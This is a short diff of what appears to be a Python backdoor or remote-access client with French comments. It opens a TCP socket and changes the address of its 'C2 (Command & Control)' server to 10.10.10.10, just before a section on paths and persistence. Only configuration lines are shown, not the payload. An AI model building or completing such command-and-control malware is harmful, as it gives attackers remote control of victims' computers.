@@ -37,7 +37,7 @@ receive = ''
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Adresse IP du serveur C2 (Command & Control)
-myip = "10.20.10.104"
+myip = "10.10.10.10"
 
 # ============================================
 # CHEMINS ET PERSISTENCE
